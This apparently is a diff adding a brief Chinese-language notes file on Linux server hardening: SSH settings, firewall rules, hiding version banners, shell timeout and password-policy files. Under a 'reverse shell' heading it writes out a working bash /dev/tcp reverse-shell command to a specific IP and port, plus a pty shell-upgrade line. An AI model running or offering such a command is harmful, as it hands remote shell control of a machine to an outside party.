@@ -1,0 +1,35 @@
+
+刷登陆：频繁刷某个url，过滤并拉黑
+cc攻击：验证码
+ddos：流量攻击，cdn，封ip
+反弹：python -c 'import pty; pty.spawn("/bin/bash")'
+         exec 9<> /dev/tcp/207.148.84.102/8008;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;^Mno
+
+计划任务    家目录     passwd/shadow   --- i权限
+
+
+隐藏服务器版本：
+    mv /etc/issue /etc/system.bak
+    mv /etc/issue.net /etc/system.netbak
+远程登陆优化
+        sed -i '38a PermitRootLogin no ' /etc/ssh/sshd_config
+        sed -i '38a UseDNS no ' /etc/ssh/sshd_config
+        sed -i '38a MaxAuthTries 3' /etc/ssh/sshd_config
+添加自定义用户并设置密码/自定义目录
+下载：基础依赖包，数据库备份包，常用包，提供服务包
+防火墙：建立黑白名单，关闭多余的端口，禁ping
+优化环境：
+	export TMOUT=600 终端退出时间  
+	HISTSIZE=1000
+	export HISTTIMEFORMAT="%F %T"
+
+安全
+firewalld
+/etc/hosts.deny
+/etc/sudoers  
+/etc/ssh/sshd_config
+/etc/issue、/etc/issue.net 来控制本地及远程登录前的信息显示
+/etc/motd    登陆后的信息显示
+
+linux下设置密码复杂度限制:
+/etc/login.defs        /etc/pam.d/system-auth
